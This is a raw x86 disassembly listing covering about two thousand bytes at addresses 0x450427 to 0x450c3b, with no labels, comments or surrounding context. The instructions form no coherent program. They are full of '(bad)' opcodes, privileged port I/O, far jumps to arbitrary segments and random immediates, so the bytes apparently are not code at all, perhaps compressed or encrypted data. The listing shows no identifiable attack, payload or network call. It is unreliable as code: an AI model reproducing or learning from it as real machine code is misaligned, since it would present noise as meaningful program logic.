  450427:	sbb    edi,0x1b57a798
  45042d:	stc    
  45042e:	jmp    0x1447:0xd4906c7c
  450435:	ror    DWORD PTR [ebx-0x59],1
  450438:	clc    
  450439:	mov    edx,0xf196b3f9
  45043e:	xchg   esp,eax
  45043f:	and    BYTE PTR [ecx+ecx*8],bl
  450442:	into   
  450443:	aas    
  450444:	lahf   
  450445:	pop    ebp
  450446:	sub    ebp,ebx
  450448:	out    dx,al
  450449:	pop    ebx
  45044a:	das    
  45044b:	ds sub eax,0xfa418b91
  450451:	adc    bh,al
  450453:	ficomp WORD PTR [eax]
  450455:	pop    ss
  450456:	cmp    eax,0xa13f968e
  45045b:	aad    0x1e
  45045d:	pop    ebp
  45045e:	test   al,0xc6
  450460:	mov    DWORD PTR [eax+eax*4],ecx
  450463:	test   BYTE PTR [ecx],bl
  450465:	icebp  
  450466:	mov    cl,0x4
  450468:	cmc    
  450469:	pop    edi
  45046a:	fimul  DWORD PTR [esi-0x4b]
  45046d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  45046e:	inc    edx
  45046f:	out    dx,eax
  450470:	imul   edi,DWORD PTR [ebp-0x1b],0x27
  450474:	push   ds
  450475:	sub    DWORD PTR [edx+0x74],edi
  450478:	sub    eax,0xd43b2762
  45047d:	mov    ds:0x26f6b46b,al
  450482:	push   ds
  450483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450484:	shr    DWORD PTR [ebp-0x2b],0xf5
  450488:	mov    eax,ds:0x434b541
  45048d:	pop    ds
  45048e:	adc    bh,BYTE PTR [ecx]
  450490:	sub    ebp,ebx
  450492:	mov    ch,0x71
  450494:	push   edi
  450495:	shl    DWORD PTR [ebx-0x15d23e3c],cl
  45049b:	retf   0x67d1
  45049e:	mov    esp,0x20656b94
  4504a3:	out    dx,eax
  4504a4:	fst    QWORD PTR ds:0x9b84218c
  4504aa:	(bad)  
  4504ab:	pop    esp
  4504ac:	mov    al,0x89
  4504ae:	inc    esp
  4504af:	call   0xf93e1807
  4504b4:	cmp    cl,BYTE PTR [ebp+0x390dbcbd]
  4504ba:	mov    edx,0xfa892664
  4504bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4504c0:	or     ah,BYTE PTR [ebp-0xe56a2d]
  4504c6:	adc    eax,DWORD PTR [edx+edx*8-0x373b338f]
  4504cd:	stos   DWORD PTR es:[edi],eax
  4504ce:	sub    ecx,DWORD PTR gs:[edi]
  4504d1:	jo     0x450512
  4504d3:	in     al,0x93
  4504d5:	xchg   ecx,eax
  4504d6:	sub    cl,BYTE PTR [ebp+ecx*8-0x647d1a60]
  4504dd:	xchg   BYTE PTR [esi-0x4705446f],al
  4504e3:	les    esp,FWORD PTR [edx]
  4504e5:	add    DWORD PTR [ebx],esi
  4504e7:	adc    DWORD PTR [ebp-0x470ff33f],esi
  4504ed:	pop    ecx
  4504ee:	fwait
  4504ef:	cwde   
  4504f0:	pop    ds
  4504f1:	imul   eax,edi,0x6e897686
  4504f7:	clc    
  4504f8:	xor    DWORD PTR [esi+0xddc29fb],ebx
  4504fe:	fadd   QWORD PTR [esi+0x6d6f9fc8]
  450504:	cdq    
  450505:	sub    eax,0xa8f964d8
  45050a:	and    edx,edi
  45050c:	inc    ecx
  45050d:	mov    al,ds:0xbe11f83b
  450512:	add    al,0xb5
  450514:	jnp    0x450513
  450516:	pop    edx
  450517:	add    ecx,DWORD PTR [bp+si-0x4c]
  45051b:	jae    0x4504c6
  45051d:	mov    ds:0x49c2eb7d,eax
  450522:	xor    BYTE PTR [ecx+0x75],0x57
  450526:	sar    al,1
  450528:	push   ebp
  450529:	aad    0x15
  45052b:	jge    0x45050f
  45052d:	adc    al,0xce
  45052f:	test   eax,0xf8339e17
  450534:	pop    edi
  450535:	mov    eax,ds:0xd4ffe172
  45053a:	dec    ebx
  45053b:	retf   
  45053c:	(bad)  
  45053d:	xchg   ebx,eax
  45053e:	(bad)  
  45053f:	mov    edi,0xce204324
  450544:	push   0x39
  450546:	cdq    
  450547:	mov    ecx,0x53f103b
  45054c:	in     al,0x57
  45054e:	mov    bl,0xec
  450550:	pop    edi
  450551:	add    al,0x1b
  450553:	in     eax,0x85
  450555:	sub    BYTE PTR [ebp+0x156ce7f3],cl
  45055b:	xchg   ecx,eax
  45055c:	pop    ss
  45055d:	jns    0x450579
  45055f:	xchg   edi,eax
  450560:	and    cl,BYTE PTR [edx]
  450562:	out    dx,al
  450563:	imul   eax,ebx,0x892b3ba2
  450569:	gs mov ah,0xdd
  45056c:	aad    0x62
  45056e:	(bad)  
  45056f:	lods   al,BYTE PTR ds:[esi]
  450570:	das    
  450571:	stos   BYTE PTR es:[edi],al
  450572:	mov    cl,0x34
  450574:	leave  
  450575:	ror    DWORD PTR [esi+0x6af9d57c],1
  45057b:	sti    
  45057c:	mov    ch,0xf8
  45057e:	lock xchg esp,eax
  450580:	add    cl,BYTE PTR [ecx-0x30]
  450583:	addr16 sbb al,0xc0
  450586:	mov    cl,0x74
  450588:	in     eax,0xac
  45058a:	sahf   
  45058b:	cmp    al,0x57
  45058d:	sti    
  45058e:	xor    al,0xdf
  450590:	and    eax,0x76e818e5
  450595:	adc    cl,0x70
  450598:	out    0xe2,eax
  45059a:	mov    esp,0xe73961c4
  45059f:	lods   eax,DWORD PTR ds:[esi]
  4505a0:	test   al,ch
  4505a2:	dec    edx
  4505a3:	out    0xb5,eax
  4505a5:	xchg   ecx,eax
  4505a6:	loope  0x450599
  4505a8:	fisubr WORD PTR [edx]
  4505aa:	adc    DWORD PTR es:[esp+ebx*4-0x41],edx
  4505af:	mov    ebx,DWORD PTR [edx+0x21]
  4505b2:	mov    dh,0xb1
  4505b4:	ja     0x450556
  4505b6:	fistp  DWORD PTR [ebp+0x65418f8c]
  4505bc:	fnstcw WORD PTR [ebx]
  4505be:	adc    al,bh
  4505c0:	xchg   BYTE PTR [ecx-0x2b],bl
  4505c3:	add    bh,dh
  4505c5:	xchg   BYTE PTR [esi],dh
  4505c7:	enter  0x62ca,0xb0
  4505cb:	xlat   BYTE PTR ds:[ebx]
  4505cc:	push   esi
  4505cd:	das    
  4505ce:	adc    DWORD PTR [eax],0xffffff90
  4505d1:	mov    ebx,0x63e1d812
  4505d6:	mov    ebx,0x8ee9203e
  4505db:	mov    ebp,0x3c8199e5
  4505e0:	or     eax,0x1e52df3f
  4505e5:	popa   
  4505e6:	adc    edx,0xfffffff9
  4505e9:	pop    eax
  4505ea:	adc    ch,0x1f
  4505ed:	fldcw  WORD PTR [eax-0x8]
  4505f0:	jnp    0x450580
  4505f2:	or     DWORD PTR [esi-0x4e],ebp
  4505f5:	clc    
  4505f6:	dec    ebx
  4505f7:	ins    BYTE PTR es:[edi],dx
  4505f8:	addr16 pop ss
  4505fa:	dec    ecx
  4505fb:	push   0xffffffd5
  4505fd:	xchg   edx,eax
  4505fe:	sahf   
  4505ff:	in     eax,dx
  450600:	jmp    0x84645c51
  450605:	push   ebp
  450606:	mov    ah,0x64
  450608:	pushf  
  450609:	loopne 0x4505fe
  45060b:	dec    eax
  45060c:	gs mov esi,0xaa15eda8
  450612:	inc    ebp
  450613:	popa   
  450614:	sbb    eax,0x271990b9
  450619:	bound  ebx,QWORD PTR [ebp+0x12]
  45061c:	adc    DWORD PTR ds:0x2386970c,ecx
  450622:	mov    ecx,0x40099de9
  450627:	jmp    0x45062d
  450629:	leave  
  45062a:	repz dec ebx
  45062c:	mov    esp,0x1bf52767
  450631:	jle    0x45069c
  450633:	(bad)
  450636:	or     al,0xfb
  450638:	rol    dh,cl
  45063a:	ss xor al,0xc6
  45063d:	cmp    bh,BYTE PTR [eax+0x58b920d8]
  450643:	(bad)  [ebp+0x70367347]
  450649:	sahf   
  45064a:	retf   
  45064b:	xchg   esp,eax
  45064c:	inc    ecx
  45064d:	mov    edx,0xe2e8da8b
  450652:	cmp    cl,ch
  450654:	adc    bh,BYTE PTR ss:[edi+0x61ca0b84]
  45065b:	popf   
  45065c:	gs in  eax,dx
  45065e:	mov    ch,0xea
  450660:	out    dx,al
  450661:	mov    WORD PTR [eax],?
  450663:	inc    ebx
  450664:	push   ds
  450665:	sub    DWORD PTR [edx+0x6b],esi
  450668:	fbld   TBYTE PTR [ecx-0x55ec3de9]
  45066e:	jnp    0x4506c8
  450670:	pop    edi
  450671:	pop    ebx
  450672:	pop    ebp
  450673:	xchg   edx,eax
  450674:	jbe    0x450611
  450676:	iret   
  450677:	(bad)  
  450678:	mov    eax,ds:0x388f0e69
  45067d:	retf   
  45067e:	mov    ah,0xa4
  450680:	bound  ecx,QWORD PTR [ecx]
  450682:	test   eax,0x44056bcf
  450687:	imul   edx,ebx,0x8616a7cb
  45068d:	fisttp DWORD PTR [edx-0x4f2e6b22]
  450693:	ret    
  450694:	and    edi,ecx
  450696:	mov    ah,0x7d
  450698:	dec    esp
  450699:	mov    eax,0x9cbd926e
  45069e:	mov    esi,DWORD PTR [edx+0x1fd80699]
  4506a4:	out    0xbd,al
  4506a6:	call   0xcc74:0xba7b1e84
  4506ad:	jle    0x45066e
  4506af:	test   eax,0x56cb9d3d
  4506b4:	mov    dl,0x8e
  4506b6:	jp     0x4506ca
  4506b8:	mov    ds:0x19a246bf,al
  4506bd:	gs mov edx,0xce54bd54
  4506c3:	pusha  
  4506c4:	jne    0x4506df
  4506c6:	inc    ecx
  4506c7:	out    0xc8,al
  4506c9:	jno    0x450690
  4506cb:	push   edx
  4506cc:	or     dl,0x20
  4506cf:	retf   0xd91d
  4506d2:	xor    BYTE PTR ss:[ebx],ah
  4506d5:	jb     0x450717
  4506d7:	xor    dh,BYTE PTR [ebp+0x71ee47b1]
  4506dd:	pop    esi
  4506de:	dec    esi
  4506df:	add    BYTE PTR [ecx+ebp*1],ah
  4506e2:	popf   
  4506e3:	scas   eax,DWORD PTR es:[edi]
  4506e4:	rcl    DWORD PTR [ebp-0x11],cl
  4506e7:	cmp    cl,BYTE PTR [ecx+ebp*4]
  4506ea:	retf   
  4506eb:	enter  0x3ee8,0xa0
  4506ef:	sub    BYTE PTR [ecx+eax*1+0x68],0x6a
  4506f4:	push   ds
  4506f5:	outs   dx,DWORD PTR ds:[esi]
  4506f6:	push   esi
  4506f7:	push   ebp
  4506f8:	and    ebx,DWORD PTR [ecx+0x23]
  4506fb:	test   BYTE PTR [edx],dl
  4506fd:	jl     0x45069d
  4506ff:	push   ss
  450700:	out    0xd9,al
  450702:	test   ebp,0x5c419d3a
  450708:	and    ecx,DWORD PTR ds:0x8927e353
  45070e:	(bad)  
  45070f:	int    0xc0
  450711:	mov    ds:0x9fd462e8,eax
  450716:	rcl    BYTE PTR ss:[edi-0x6af3f9ae],cl
  45071d:	js     0x4506df
  45071f:	hlt    
  450720:	pop    es
  450721:	(bad)  [eax-0x6d]
  450724:	sbb    dl,ah
  450726:	mov    esi,0xa5b14aec
  45072b:	push   ss
  45072c:	add    al,0xa4
  45072e:	jnp    0x450748
  450730:	arpl   WORD PTR [ecx-0x7c],dx
  450733:	aaa    
  450734:	stos   BYTE PTR es:[edi],al
  450735:	cdq    
  450736:	cmp    ebp,DWORD PTR [esi+0x26]
  450739:	out    0x27,al
  45073b:	mov    dh,0x46
  45073d:	pop    edx
  45073e:	retf   
  45073f:	sbb    dl,BYTE PTR [esi+0x25e6aab3]
  450745:	or     edi,DWORD PTR [esi-0x10ccf3ec]
  45074b:	mov    eax,0xdc306cea
  450750:	add    eax,0x42659ec0
  450755:	dec    esi
  450756:	mov    dh,0x82
  450758:	and    cl,BYTE PTR [ecx-0x242da48a]
  45075e:	jb     0x4506fe
  450760:	add    DWORD PTR [esi],0x3c
  450763:	shl    BYTE PTR ds:[edi+ebp*2],1
  450767:	push   0x6dee2113
  45076c:	sub    edx,DWORD PTR [ebx]
  45076e:	lods   eax,DWORD PTR ds:[esi]
  45076f:	and    eax,0xee6d5133
  450774:	cs cs jg 0x450728
  450778:	sbb    ebx,DWORD PTR [ecx-0x47]
  45077b:	xchg   edi,eax
  45077c:	rcl    DWORD PTR ds:0x8924695b,cl
  450782:	mov    ecx,0x4aa6b66b
  450787:	or     dh,BYTE PTR [esi-0x1fa04465]
  45078d:	mov    dl,0x19
  45078f:	sbb    eax,0x7580b880
  450794:	xchg   edi,eax
  450795:	or     BYTE PTR [eax+0x46d76184],dh
  45079b:	push   0xffffffbd
  45079d:	test   al,0xab
  45079f:	sbb    eax,0x886300bb
  4507a4:	sbb    al,0x86
  4507a6:	dec    ecx
  4507a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4507a8:	cmp    DWORD PTR [eax-0x51ad0b48],ecx
  4507ae:	or     eax,0x85cb1aa6
  4507b3:	test   eax,0x94b55cfe
  4507b8:	and    al,0x58
  4507ba:	fwait
  4507bb:	dec    ebx
  4507bc:	nop
  4507bd:	push   ecx
  4507be:	in     eax,0xe4
  4507c0:	pop    ds
  4507c1:	jbe    0x4507ca
  4507c3:	jg     0x450763
  4507c5:	mov    ebp,0x56b5e0b9
  4507ca:	ss in  al,dx
  4507cc:	stos   BYTE PTR es:[edi],al
  4507cd:	sti    
  4507ce:	xchg   esp,eax
  4507cf:	adc    al,0xe0
  4507d1:	pop    edx
  4507d2:	les    ecx,FWORD PTR [ecx+0x30]
  4507d5:	mov    cl,0x88
  4507d7:	loopne 0x4507b7
  4507d9:	retf   
  4507da:	cmp    eax,0xbdfd2a52
  4507df:	mov    eax,ds:0x99fba565
  4507e4:	imul   eax,ecx,0x4917a3b5
  4507ea:	jbe    0x450775
  4507ec:	adc    DWORD PTR [edi+eax*2],ebp
  4507ef:	les    ebx,FWORD PTR [edi+0x1f]
  4507f2:	rol    al,1
  4507f4:	sbb    eax,0x5edca079
  4507f9:	rcl    DWORD PTR ds:0xc8091d16,0x9
  450800:	cdq    
  450801:	neg    DWORD PTR [ebx-0x133aaea6]
  450807:	mov    ds:0x79aba0dd,al
  45080c:	and    al,0xce
  45080e:	dec    ebp
  45080f:	repnz sbb BYTE PTR [ecx+0x189fab47],bh
  450816:	adc    al,BYTE PTR [edi+0x762ba886]
  45081c:	cmc    
  45081d:	mov    dh,0xf5
  45081f:	(bad)  
  450821:	pop    ds
  450822:	adc    BYTE PTR [eax-0x2b4f9199],dl
  450828:	fistp  DWORD PTR [ecx+0x60]
  45082b:	dec    edi
  45082c:	in     eax,0xe3
  45082e:	mov    ch,0xf3
  450830:	and    DWORD PTR [edx-0x37],esp
  450833:	data16 jecxz 0x450850
  450836:	sub    al,0x31
  450838:	and    ebp,ecx
  45083a:	(bad)  
  45083b:	shl    BYTE PTR [ebx],0xcf
  45083e:	loopne 0x450878
  450840:	sbb    DWORD PTR [edi-0x5b],eax
  450843:	xlat   BYTE PTR ds:[ebx]
  450844:	and    edi,DWORD PTR [ebx-0x4a]
  450847:	xchg   esp,eax
  450848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  45084a:	mov    ah,0x6e
  45084c:	retf   0xb90c
  45084f:	fs cmp dl,0xdb
  450853:	fiadd  WORD PTR [ebp+0x56ef5102]
  450859:	jge    0x4507fc
  45085b:	jnp    0x450874
  45085d:	mov    ecx,0x7dea643d
  450862:	ins    DWORD PTR es:[edi],dx
  450863:	pop    ecx
  450864:	fisub  WORD PTR [ebx+ebp*4-0x7369fb5c]
  45086b:	loop   0x4508d4
  45086d:	ror    BYTE PTR [esi],cl
  45086f:	mov    ebp,0x74b2088c
  450874:	and    DWORD PTR [ecx+esi*2-0x2fa5b9ef],edx
  45087b:	adc    ebp,DWORD PTR [esi-0xcf108ee]
  450881:	push   DWORD PTR [ebx-0x643ed060]
  450887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450888:	sub    al,0xae
  45088a:	adc    DWORD PTR [eax],eax
  45088c:	popf   
  45088d:	adc    eax,0xbb45d91b
  450892:	repz mov cx,0x3c9e
  450897:	mov    ebp,0xbcd3d91f
  45089c:	push   ecx
  45089d:	inc    esi
  45089e:	xchg   edi,esp
  4508a0:	inc    eax
  4508a1:	pushf  
  4508a2:	cmp    edx,edi
  4508a4:	or     eax,0xca4b64a1
  4508a9:	sub    esp,DWORD PTR [esi]
  4508ab:	mov    esi,0x252da708
  4508b0:	sbb    al,BYTE PTR [edi+0x7961b314]
  4508b6:	ins    BYTE PTR es:[edi],dx
  4508b7:	mov    ds:0x837a8d26,eax
  4508bc:	les    edi,FWORD PTR [edx-0x6e4fd4b]
  4508c2:	daa    
  4508c3:	test   eax,0xe64a1671
  4508c8:	adc    DWORD PTR [esi-0x43f6f085],esp
  4508ce:	adc    BYTE PTR [edi-0x5e],bl
  4508d1:	push   es
  4508d2:	(bad)  
  4508d3:	lea    ecx,[bp+di-0x4d]
  4508d7:	je     0x4508e1
  4508d9:	pop    ss
  4508da:	mov    al,0x43
  4508dc:	(bad)  
  4508dd:	adc    al,0x3d
  4508df:	push   esi
  4508e0:	cmp    al,0x9c
  4508e2:	mov    bh,0x30
  4508e4:	(bad)  
  4508e6:	or     al,0xec
  4508e8:	lods   eax,DWORD PTR ds:[esi]
  4508e9:	cdq    
  4508ea:	cmp    ebp,DWORD PTR [eax-0x2d4c6830]
  4508f0:	xchg   ebp,eax
  4508f1:	xchg   esi,eax
  4508f2:	scas   eax,DWORD PTR es:[edi]
  4508f3:	aad    0x7e
  4508f5:	mov    dl,0xd8
  4508f7:	mov    al,ds:0xf0bf9af5
  4508fc:	inc    ebp
  4508fd:	cmp    eax,0x7916a2ec
  450902:	push   eax
  450903:	push   ebx
  450904:	cld    
  450905:	enter  0x84d4,0x5f
  450909:	mov    ds:0xf98f392b,eax
  45090e:	inc    ebp
  45090f:	test   al,0x3
  450911:	sti    
  450912:	sahf   
  450913:	and    DWORD PTR [esi],0xc594b48b
  450919:	dec    ebx
  45091a:	and    eax,0xe5ab3517
  45091f:	in     eax,dx
  450920:	mov    ss,WORD PTR [esi-0x7c]
  450923:	mov    ebx,0x3f832918
  450928:	adc    bh,BYTE PTR [eax]
  45092a:	or     esp,DWORD PTR [esi+eiz*4-0x5]
  45092e:	push   0xffffffcf
  450930:	xor    eax,0xd2f34bd2
  450935:	pop    esp
  450936:	lahf   
  450937:	inc    esp
  450938:	pop    es
  450939:	cmp    ch,bh
  45093b:	mov    bh,0x90
  45093d:	mov    eax,ds:0xdfd4605b
  450942:	inc    edx
  450943:	loope  0x45098b
  450945:	mov    edi,DWORD PTR [ebp+edx*2+0x7e]
  450949:	mov    eax,0x228516a3
  45094e:	mov    BYTE PTR [eax],cl
  450950:	mov    dl,0x10
  450952:	xor    cl,bl
  450954:	push   esi
  450955:	mov    dh,BYTE PTR [ebx]
  450957:	cmc    
  450958:	or     DWORD PTR [ebx+0xfeedf06],esp
  45095e:	sbb    ch,cl
  450960:	sbb    BYTE PTR [ecx],bl
  450962:	retw   
  450964:	popa   
  450965:	xor    DWORD PTR [esi-0x19],edi
  450968:	sub    al,0xb5
  45096a:	stos   BYTE PTR es:[edi],al
  45096b:	repz xor ecx,ebp
  45096e:	dec    ebx
  45096f:	test   al,0x14
  450971:	imul   ecx,DWORD PTR [edx-0x66fd0f9a],0x44bee567
  45097b:	lock lock imul edx,DWORD PTR [esi-0x58],0x19
  450981:	sub    DWORD PTR [edx-0x3],edx
  450984:	lea    edx,[esi*4-0x645b3360]
  45098b:	imul   ecx,DWORD PTR [edx],0xa9f8f5d2
  450991:	mov    esp,0x9d2e98d8
  450996:	ret    
  450997:	and    al,0xec
  450999:	and    BYTE PTR [ebx],ch
  45099b:	pop    ss
  45099c:	iret   
  45099d:	cdq    
  45099e:	sti    
  45099f:	shl    DWORD PTR [ebx-0x3dbe7a16],1
  4509a5:	sbb    eax,0x4b46acd7
  4509aa:	mov    cl,0x54
  4509ac:	mov    cl,BYTE PTR [esi]
  4509ae:	mov    BYTE PTR [ebx+0x14],ch
  4509b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4509b2:	sbb    esi,DWORD PTR [eax]
  4509b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4509b5:	ror    BYTE PTR [esi-0x7b],0x20
  4509b9:	add    ebp,DWORD PTR [ecx+eax*8-0x2c]
  4509bd:	pop    ss
  4509be:	lahf   
  4509bf:	push   ss
  4509c0:	ror    BYTE PTR [ebx-0x47],0x98
  4509c4:	pop    ss
  4509c5:	iret   
  4509c6:	or     ecx,DWORD PTR [edi]
  4509c8:	in     eax,0xf9
  4509ca:	cld    
  4509cb:	add    ebx,DWORD PTR [eax+0x71b860f5]
  4509d1:	dec    ecx
  4509d2:	stos   DWORD PTR es:[edi],eax
  4509d3:	push   0x5ce5bde6
  4509d8:	adc    BYTE PTR [ebx-0x5f76db48],ah
  4509de:	sbb    esi,DWORD PTR [esi-0x7532a15d]
  4509e4:	pop    ebp
  4509e5:	sbb    DWORD PTR [edi-0x50],esi
  4509e8:	inc    esi
  4509e9:	or     esi,DWORD PTR [ecx+0x7cbfeff4]
  4509ef:	sbb    ah,BYTE PTR [ebp+0x33f45737]
  4509f5:	sahf   
  4509f6:	rcl    DWORD PTR [esp+ebx*1-0x7],0x71
  4509fb:	cld    
  4509fc:	cmp    eax,DWORD PTR [esi+edx*8]
  4509ff:	cdq    
  450a00:	and    al,dh
  450a02:	jnp    0x450a03
  450a04:	jmp    FWORD PTR [esp+edx*4-0x5512dcac]
  450a0b:	lahf   
  450a0c:	cdq    
  450a0d:	retf   0x90da
  450a10:	cld    
  450a11:	pop    esi
  450a12:	ret    
  450a13:	xor    BYTE PTR [esi+0x281fdc3d],0x53
  450a1a:	sbb    BYTE PTR gs:[ebx-0x64],ah
  450a1e:	dec    esi
  450a1f:	aam    0x1f
  450a21:	or     ecx,esi
  450a23:	sbb    al,0x4b
  450a25:	gs ss xor al,0x84
  450a29:	test   al,0x6b
  450a2b:	(bad)
  450a2f:	jp     0x450a75
  450a31:	sub    esi,ebp
  450a33:	adc    DWORD PTR [ebx-0x17],eax
  450a36:	mov    cl,0x4
  450a38:	adc    DWORD PTR [esp+ecx*4+0x28],ecx
  450a3c:	in     eax,0x89
  450a3e:	mov    ecx,0x841c72e9
  450a43:	adc    al,0x19
  450a45:	jns    0x450a76
  450a47:	xor    al,cl
  450a49:	add    dh,bl
  450a4b:	xor    al,0x3b
  450a4d:	fwait
  450a4e:	or     ebp,DWORD PTR [ebx]
  450a50:	jecxz  0x450ac4
  450a52:	sub    DWORD PTR [ebx-0x21a5a332],esp
  450a58:	sti    
  450a59:	sub    al,0xbc
  450a5b:	adc    al,0xb6
  450a5d:	adc    BYTE PTR [ebx-0x20],bh
  450a60:	inc    ebp
  450a61:	das    
  450a62:	movntq QWORD PTR [ebp+ebx*1+0x29c54f02],mm4
  450a6a:	std    
  450a6b:	jecxz  0x450add
  450a6d:	or     DWORD PTR [ecx],edi
  450a6f:	xchg   edi,eax
  450a70:	mov    cl,0x24
  450a72:	mov    edx,0x2c84bf44
  450a77:	and    esp,DWORD PTR [ebx-0x2f]
  450a7a:	push   eax
  450a7b:	mov    esi,0xbab0e460
  450a80:	mov    ch,0xac
  450a82:	sbb    al,0x6e
  450a84:	in     eax,dx
  450a85:	pop    eax
  450a86:	scas   al,BYTE PTR es:[edi]
  450a87:	out    dx,al
  450a88:	xor    DWORD PTR [esi-0x36],esp
  450a8b:	outs   dx,BYTE PTR ds:[esi]
  450a8c:	(bad)  
  450a8d:	std    
  450a8e:	cmp    edi,DWORD PTR [edi-0x17affe6f]
  450a94:	jmp    0x156d6acf
  450a99:	cdq    
  450a9a:	mov    ebp,0x28645474
  450a9f:	jecxz  0x450a67
  450aa1:	lgs    edi,FWORD PTR [ebp+0x1b]
  450aa5:	cmp    eax,esi
  450aa7:	aas    
  450aa8:	fldcw  WORD PTR [edi-0x10c3b875]
  450aae:	cwde   
  450aaf:	inc    esi
  450ab0:	ins    DWORD PTR es:[edi],dx
  450ab1:	xchg   esp,eax
  450ab2:	mov    esp,0xaf4ae360
  450ab7:	(bad)  
  450ab8:	ins    BYTE PTR es:[edi],dx
  450ab9:	cdq    
  450aba:	jp     0x450adf
  450abc:	les    ebx,FWORD PTR [esi-0x25bac74d]
  450ac2:	cwde   
  450ac3:	xor    al,0x2a
  450ac5:	inc    esp
  450ac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450ac7:	aad    0x8e
  450ac9:	inc    ebp
  450aca:	rcr    BYTE PTR ds:0x6fdb43cf,0x65
  450ad1:	add    ecx,DWORD PTR [ebx-0x10]
  450ad4:	test   eax,0x1ca992fc
  450ad9:	jns    0x450abf
  450adb:	pop    esp
  450adc:	sbb    eax,0xc87f265
  450ae1:	sub    DWORD PTR [edi],0xffffffef
  450ae4:	adc    ecx,ecx
  450ae6:	fistp  DWORD PTR [ebp-0x6d64199a]
  450aec:	mov    gs,WORD PTR [eax-0x65e961d1]
  450af2:	stc    
  450af3:	fst    DWORD PTR [ebp+0x75f3505a]
  450af9:	cmp    al,0xd8
  450afb:	mov    cl,0xc
  450afd:	push   0xffffff92
  450aff:	add    esp,DWORD PTR [ebx-0x5b]
  450b02:	mov    DWORD PTR [eax+0x68],edx
  450b05:	inc    esp
  450b06:	pushf  
  450b07:	add    DWORD PTR [ebp+0x77],edx
  450b0a:	arpl   ax,si
  450b0c:	pop    ecx
  450b0d:	sub    cl,BYTE PTR [ebx+0x6b]
  450b10:	pop    ds
  450b11:	test   eax,0xa51a5098
  450b16:	sub    dh,ah
  450b18:	pop    es
  450b19:	in     al,0x22
  450b1b:	repz adc eax,0x2eef7d5d
  450b21:	mov    eax,ds:0x191f2106
  450b26:	sbb    ebx,DWORD PTR [edx-0x3135fb12]
  450b2c:	adc    ch,BYTE PTR [ecx-0x52f08c65]
  450b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450b33:	cs push 0xbc880386
  450b39:	das    
  450b3a:	loop   0x450ba0
  450b3c:	out    0x99,al
  450b3e:	xchg   esi,eax
  450b3f:	xchg   esp,eax
  450b40:	loopne 0x450ae7
  450b42:	jnp    0x450b7d
  450b44:	ja     0x450ad2
  450b46:	mov    ebp,0xe517801e
  450b4b:	div    DWORD PTR [ebx-0x467b48fd]
  450b51:	clc    
  450b52:	leave  
  450b53:	sub    dl,bh
  450b55:	dec    edx
  450b56:	sbb    al,0xbd
  450b58:	shl    BYTE PTR [ecx-0x2d00a46c],cl
  450b5e:	push   es
  450b5f:	out    dx,eax
  450b60:	clc    
  450b61:	pop    ecx
  450b62:	pop    ebx
  450b63:	inc    edi
  450b64:	xchg   ebx,eax
  450b65:	mov    ch,0xe5
  450b67:	imul   BYTE PTR [edi]
  450b69:	lea    ecx,[ecx+0x7d]
  450b6c:	and    BYTE PTR [ebx-0x5929ab85],ch
  450b72:	arpl   bp,bx
  450b74:	lahf   
  450b75:	lock dec edx
  450b77:	xchg   DWORD PTR ds:0x3369300e,edx
  450b7d:	addr16 mov edi,0x6d432534
  450b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450b84:	push   ss
  450b85:	inc    esp
  450b86:	das    
  450b87:	add    DWORD PTR [ebx*8-0x3543fab2],ebx
  450b8e:	and    al,0xee
  450b90:	sbb    edx,DWORD PTR [esi]
  450b92:	cs mov ch,0x19
  450b95:	les    ecx,FWORD PTR [eax+0x6c0cfd52]
  450b9b:	out    0x32,al
  450b9d:	jmp    0x3993:0xa0b2d0e2
  450ba4:	jo     0x450bc0
  450ba6:	and    dh,cl
  450ba8:	mov    bh,0x2a
  450baa:	popf   
  450bab:	mov    ch,0x1b
  450bad:	sbb    eax,0x10a1c3a8
  450bb2:	das    
  450bb3:	in     al,dx
  450bb4:	adc    eax,0xdebe781
  450bb9:	sub    ah,BYTE PTR [esi+ecx*1-0x4d0966c5]
  450bc0:	xchg   esp,eax
  450bc1:	outs   dx,DWORD PTR ds:[esi]
  450bc2:	xor    ebp,edx
  450bc4:	add    DWORD PTR [ebx+0x42e5e583],ecx
  450bca:	jl     0x450bba
  450bcc:	dec    cl
  450bce:	imul   cl
  450bd0:	sbb    al,0xb9
  450bd2:	xchg   ebx,eax
  450bd3:	ja     0x450bb9
  450bd5:	or     eax,0xa2a42204
  450bda:	mov    ebx,0x7846c5c0
  450bdf:	sub    ah,BYTE PTR [ebx]
  450be1:	int    0x42
  450be3:	lods   eax,DWORD PTR ds:[esi]
  450be4:	(bad)  
  450be5:	in     eax,dx
  450be6:	mov    bh,0x44
  450be8:	out    dx,eax
  450be9:	mov    ecx,ss
  450beb:	jmp    0xf72a:0x19079356
  450bf2:	mov    dl,0x76
  450bf4:	cmp    dh,BYTE PTR [bx+si+0x12ac]
  450bf9:	mov    ebp,0x91f17bef
  450bfe:	xchg   esp,eax
  450bff:	into   
  450c00:	lock or esp,esp
  450c03:	sahf   
  450c04:	push   ds
  450c05:	pop    edx
  450c06:	adc    al,0xcf
  450c08:	nop
  450c09:	test   al,0x1b
  450c0b:	add    eax,0x82805cf4
  450c10:	popa   
  450c11:	sbb    eax,0xdf762c5a
  450c16:	mov    esp,0xb57394e4
  450c1b:	xchg   ecx,eax
  450c1c:	test   DWORD PTR [eax],esp
  450c1e:	shr    edx,cl
  450c20:	xchg   esp,eax
  450c21:	cwde   
  450c22:	(bad)  
  450c23:	in     eax,dx
  450c24:	je     0x450bd1
  450c26:	mov    cs,ecx
  450c28:	inc    ebp
  450c29:	jnp    0x450c37
  450c2b:	(bad)  
  450c2c:	sbb    eax,0x5ba07bd9
  450c31:	repnz (bad) 
  450c33:	in     al,dx
  450c34:	xchg   ecx,eax
  450c35:	adc    edi,DWORD PTR [eax-0x2d16388c]
  450c3b:	fimul  WORD PTR [ecx+0x4d92b362]
